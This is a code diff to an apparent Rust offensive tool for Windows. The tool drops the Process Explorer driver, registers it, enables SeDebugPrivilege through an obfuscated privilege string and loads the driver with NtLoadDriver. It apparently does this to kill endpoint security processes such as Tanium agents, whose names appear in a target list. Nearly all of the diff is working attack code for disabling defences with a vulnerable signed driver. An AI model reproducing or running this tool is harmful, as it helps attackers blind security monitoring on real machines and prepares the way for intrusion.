@@ -1,6 +1,11 @@
 use colored::Colorize;
 use ntapi::ntapi_base::CLIENT_ID;
+use ntapi::ntioapi::NtLoadDriver;
 use rust_syscalls::syscall;
+use winapi::shared::minwindef::DWORD;
+use winapi::shared::minwindef::FALSE;
+use winapi::shared::ntdef::UNICODE_STRING;
+use winapi::um::errhandlingapi::GetLastError;
 use winapi::um::winnt::TOKEN_ELEVATION;
 use winapi::um::winnt::TOKEN_QUERY;
 use winapi::um::winnt::TokenElevation;
@@ -25,17 +30,36 @@ use winapi::um::securitybaseapi::GetTokenInformation;
 use winapi::um::winbase::LookupPrivilegeValueW;
 use winapi::um::winnt::TokenPrivileges;
 use winapi::um::winnt::PROCESS_SUSPEND_RESUME;
-use winapi::um::winnt::SE_DEBUG_NAME;
 use winapi::um::winnt::SE_PRIVILEGE_ENABLED;
 use winapi::um::winnt::TOKEN_ADJUST_PRIVILEGES;
 use winapi::um::winnt::TOKEN_PRIVILEGES;
 use winreg::enums::*;
 use winreg::RegKey;
 
+const SE_DEBUG_NAME: [u16 ; 17] = [83u16, 101, 68, 101, 98, 117, 103, 80, 114, 105, 118, 105, 108, 101, 103, 101, 0];
+const DRIVERNAME: &str = "ProcExp64";
+
+pub fn create_unicode_string(s: &[u16]) -> UNICODE_STRING {
+    // source: https://not-matthias.github.io/posts/kernel-driver-with-rust/
+    let len = s.len();
+
+    let n = if len > 0 && s[len - 1] == 0 { len - 1 } else { len };
+
+    UNICODE_STRING {
+        Length: (n * 2) as u16,
+        MaximumLength: (len * 2) as u16,
+        Buffer: s.as_ptr() as _,
+    }
+}
+
 fn load_driver(drivername: String) -> bool {
-    //servicename = servicename as PUNICODE_STRING;
+
+    let mut p_drivername: UNICODE_STRING = create_unicode_string(obfstr::wide!("ProcExp64\0"));
+    //println!("{:#?}", p_drivername);
+
     unsafe {
-        let ntstatus = syscall!("NtLoadDriver", drivername);
+        //let ntstatus = syscall!("NtLoadDriver", p_drivername);
+        let ntstatus = NtLoadDriver(&mut p_drivername);
         match ntstatus {
             0 => {
                 let message = format!("[+] Successfully used NtLoadDriver");
@@ -70,17 +94,35 @@ pub fn is_elevated() -> bool {
 }
 
 fn enable_privilege() -> bool {
-    let htoken: PHANDLE = null_mut();
+    // source: https://github.com/rayiik/mimiRust/blob/main/src/utilities/mod.rs
     unsafe {
-        let mut tp_privilege: TOKEN_PRIVILEGES = std::mem::zeroed();
-        tp_privilege.PrivilegeCount = 1;
-        tp_privilege.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+        let mut htoken = null_mut();
+        let mut privilege: TOKEN_PRIVILEGES = std::mem::zeroed();
 
-        let ntstatus = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, htoken);
+        privilege.PrivilegeCount = 1;
+        privilege.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+        let ntstatus = LookupPrivilegeValueW(null_mut(), SE_DEBUG_NAME.as_ptr(), &mut privilege.Privileges[0].Luid);
         match ntstatus {
-            0 => {
+            FALSE => {
+                let message = format!("[-] LookupPrivilegeValueW call failed.. NTSTATUS: {}", ntstatus);
+                println!("{}", message);
+                println!("{}", GetLastError());
+                let _ = syscall!("NtClose", htoken);
+                return false;
+            }
+            _ => {
+                let message = format!("[+] Successfully used LookupPrivilegeValueW");
+                println!("{}", message);
+            }
+        }
+
+        let ntstatus = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &mut htoken);
+        match ntstatus {
+            FALSE => {
                 let message = format!("[-] OpenProcessToken call failed.. NTSTATUS: {}", ntstatus);
                 println!("{}", message);
+                println!("{}", GetLastError());
                 let _ = syscall!("NtClose", htoken);
                 return false;
             }
@@ -134,8 +176,8 @@ fn enable_privilege() -> bool {
         let ntstatus = AdjustTokenPrivileges(
             htoken as HANDLE,
             0,
-            &mut tp_privilege,
-            std::mem::size_of_val(&tp_privilege) as u32,
+            &mut privilege,
+            std::mem::size_of_val(&privilege) as u32,
             null_mut(),
             null_mut(),
         );
@@ -327,7 +369,7 @@ fn main() {
         "TaniumCX.exe",
         "TaniumDetectEngine.exe",
     ];
-    let drivername = "ProcExp64";
+    //let drivername = "ProcExp64";
 
     let args: Vec<String> = env::args().collect();
 
@@ -355,10 +397,10 @@ fn main() {
         Err(e) => panic!("[-] Error while dropping ProcExp driver on disk: {}", e),
     };
 
-    let res_create_reg = create_registry_key(drivername.to_string(), driverpath);
+    let res_create_reg = create_registry_key(DRIVERNAME.to_string(), driverpath);
     match res_create_reg {
-        Ok(()) => println!("[+] Successfully wrote {} registry keys", drivername),
-        Err(e) => panic!("[-] Error while writting {} registry keys: {}", drivername, e),
+        Ok(()) => println!("[+] Successfully wrote {} registry keys", DRIVERNAME),
+        Err(e) => panic!("[-] Error while writting {} registry keys: {}", DRIVERNAME, e),
     }
 
     let res_enable_priv = enable_privilege();
@@ -371,13 +413,13 @@ fn main() {
         }
     }
 
-    let res_load_driver = load_driver(drivername.to_string());
+    let res_load_driver = load_driver(DRIVERNAME.to_string());
     match res_load_driver {
         true => {
-            println!("[+] Successfully loaded {} driver !", drivername);
+            println!("[+] Successfully loaded {} driver !", DRIVERNAME);
         }
         false => {
-            panic!("[-] Error while loading {} driver", drivername);
+            panic!("[-] Error while loading {} driver", DRIVERNAME);
         }
     }
     exit(0);
